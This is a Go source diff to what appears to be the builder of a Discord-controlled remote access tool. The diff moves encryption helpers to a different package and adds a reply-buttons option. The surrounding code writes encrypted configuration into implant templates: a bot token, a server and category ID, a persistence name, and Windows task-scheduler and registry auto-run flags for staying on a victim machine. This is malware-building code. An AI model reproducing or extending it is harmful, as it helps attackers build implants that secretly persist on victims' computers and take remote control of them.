@@ -6,12 +6,12 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
-	"shared/higher"
+
+	"shared"
+	"shared/base"
 
 	"builder/store"
 	"builder/utils"
-
-	"shared"
 )
 
 const (
@@ -28,6 +28,7 @@ type configBody struct {
 	CategoryID    string `json:"category_id"`
 	CommandPrefix string `json:"command_prefix"`
 	TrackingID    string `json:"tracking_id"`
+	AddButtons    bool   `json:"add_buttons_to_replies"`
 
 	UseCustomDirectory        bool   `json:"use_custom_directory"`
 	CustomDirectory           string `json:"custom_directory_path"`
@@ -75,7 +76,7 @@ func updateConfig() {
 
 		if store.SharedSecret != nil {
 			for k, v := range rawBody {
-				decrypted, err := shared.DecryptData(v.(string), store.SharedSecret, false)
+				decrypted, err := base.DecryptData(v.(string), store.SharedSecret, false)
 				if err != nil {
 					http.Error(write, fmt.Sprintf("failed to decrypt %s - %v", k, err), http.StatusBadRequest)
 					return
@@ -125,7 +126,7 @@ func updateConfig() {
 
 		cryptKey1 := utils.GenString(_CRYPTO_KEY_LEN)
 		cryptKey2 := utils.GenString(_CRYPTO_KEY_LEN)
-		cryptKey := higher.InitKey(cryptKey1, cryptKey2)
+		cryptKey := shared.InitKey(cryptKey1, cryptKey2)
 
 		if store.DEBUG {
 			fmt.Printf("crypto key - %x\n", cryptKey)
@@ -139,16 +140,17 @@ func updateConfig() {
 		utils.ReplaceString(&content, "CRYPTO_KEY_1", cryptKey1)
 		utils.ReplaceString(&content, "CRYPTO_KEY_2", cryptKey2)
 
-		utils.ReplaceString(&content, "BOT_TOKEN", higher.EncryptConfig(body.BotToken))
-		utils.ReplaceString(&content, "SERVER_ID", higher.EncryptConfig(body.ServerID))
-		utils.ReplaceString(&content, "CATEGORY_ID", higher.EncryptConfig(body.CategoryID))
+		utils.ReplaceString(&content, "BOT_TOKEN", shared.EncryptConfig(body.BotToken))
+		utils.ReplaceString(&content, "SERVER_ID", shared.EncryptConfig(body.ServerID))
+		utils.ReplaceString(&content, "CATEGORY_ID", shared.EncryptConfig(body.CategoryID))
 		utils.ReplaceString(&content, "COMMAND_PREFIX", body.CommandPrefix)
-		utils.ReplaceString(&content, "TRACKING_ID", higher.EncryptConfig(body.TrackingID))
+		utils.ReplaceString(&content, "TRACKING_ID", shared.EncryptConfig(body.TrackingID))
+		utils.ReplaceBool(&content, "ADD_BUTTONS", body.AddButtons)
 
 		utils.ReplaceBool(&content, "USE_CUSTOM_NAME", body.UseCustomName)
-		utils.ReplaceString(&content, "CUSTOM_NAME", higher.EncryptConfig(body.CustomName))
+		utils.ReplaceString(&content, "CUSTOM_NAME", shared.EncryptConfig(body.CustomName))
 		utils.ReplaceBool(&content, "USE_CUSTOM_DIR", body.UseCustomDirectory)
-		utils.ReplaceString(&content, "CUSTOM_DIR", higher.EncryptConfig(body.CustomDirectory))
+		utils.ReplaceString(&content, "CUSTOM_DIR", shared.EncryptConfig(body.CustomDirectory))
 
 		utils.ReplaceBool(&content, "REQUIRE_ADMIN", body.RequireAdmin)
 		utils.ReplaceBool(&content, "PROMPT_ADMIN", body.PromptAdmin)
@@ -158,7 +160,7 @@ func updateConfig() {
 		utils.ReplaceInt(&content, "OPEN_BOT_SOCKET_DELAY", body.ConnectBotRetryDelay)
 		utils.ReplaceBool(&content, "EXIT_IF_CANT_CONNECT", body.ExitIfCantConnect)
 
-		utils.ReplaceString(&content, "PERSISTENCE_NAME", higher.EncryptConfig(body.PersistenceName))
+		utils.ReplaceString(&content, "PERSISTENCE_NAME", shared.EncryptConfig(body.PersistenceName))
 		utils.ReplaceBool(&content, "TASK_SCHEDULAR", body.TaskSchedular)
 		utils.ReplaceBool(&content, "AUTO_RUN_REG", body.Registry)
 
